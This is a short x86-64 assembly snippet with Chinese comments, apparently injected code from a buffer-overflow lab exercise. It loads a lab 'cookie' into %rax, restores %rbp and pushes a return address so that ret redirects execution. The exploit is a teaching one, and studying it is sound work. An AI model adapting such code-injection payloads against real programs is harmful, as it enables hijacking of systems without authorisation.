mov $0x31ef3fbf, %rax    # 将 cookie 值加载到 %rax
mov $0x5567ef80, %rbp    # 恢复原来的 rbp 值
pushq $0x4014e2   
ret 